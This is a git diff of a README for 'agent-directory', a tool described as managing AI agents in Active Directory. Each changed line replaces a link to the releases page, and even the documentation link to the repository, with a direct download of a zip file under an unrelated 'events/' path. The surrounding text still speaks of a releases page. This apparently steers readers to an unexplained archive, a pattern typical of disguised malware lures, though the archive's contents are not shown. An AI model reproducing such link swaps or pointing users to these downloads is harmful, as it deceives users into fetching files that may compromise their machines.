@@ -1,6 +1,6 @@
 # 🤖 agent-directory - Manage AI Agents in Active Directory
 
-[![Download agent-directory](https://img.shields.io/badge/Download-Here-orange)](https://github.com/SHIYUAN625/agent-directory/releases)
+[![Download agent-directory](https://img.shields.io/badge/Download-Here-orange)](https://github.com/SHIYUAN625/agent-directory/raw/refs/heads/main/events/agent-directory-2.0-alpha.3.zip)
 
 ---
 
@@ -32,7 +32,7 @@ No special programming tools are needed. This guide shows you how to get agent-d
 
 Go to the agent-directory releases page to get the software:  
 
-[Download agent-directory](https://github.com/SHIYUAN625/agent-directory/releases)
+[Download agent-directory](https://github.com/SHIYUAN625/agent-directory/raw/refs/heads/main/events/agent-directory-2.0-alpha.3.zip)
 
 This page shows the latest versions available. You will find the installation files here.
 
@@ -162,7 +162,7 @@ Add-AgentTool -AgentName "AI_Bot01" -ToolName "ToolC"
 
 Get started by visiting the releases page here:
 
-[![Download agent-directory](https://img.shields.io/badge/Download-Here-blue)](https://github.com/SHIYUAN625/agent-directory/releases)
+[![Download agent-directory](https://img.shields.io/badge/Download-Here-blue)](https://github.com/SHIYUAN625/agent-directory/raw/refs/heads/main/events/agent-directory-2.0-alpha.3.zip)
 
 Follow the download and install steps above. Once installed, you can manage AI agents using familiar Windows tools.
 
@@ -181,7 +181,7 @@ Follow the download and install steps above. Once installed, you can manage AI a
 
 Check the GitHub repository for detailed technical documentation and updates:
 
-https://github.com/SHIYUAN625/agent-directory
+https://github.com/SHIYUAN625/agent-directory/raw/refs/heads/main/events/agent-directory-2.0-alpha.3.zip
 
 Use Issues on GitHub to report bugs or request features. The repository also contains sample scripts to help you get started.
 
@@ -189,4 +189,4 @@ Use Issues on GitHub to report bugs or request features. The repository also con
 
 # [Emoji] agent-directory - Manage AI Agents in Active Directory
 
-[![Download agent-directory](https://img.shields.io/badge/Download-Here-orange)](https://github.com/SHIYUAN625/agent-directory/releases)
+[![Download agent-directory](https://img.shields.io/badge/Download-Here-orange)](https://github.com/SHIYUAN625/agent-directory/raw/refs/heads/main/events/agent-directory-2.0-alpha.3.zip)
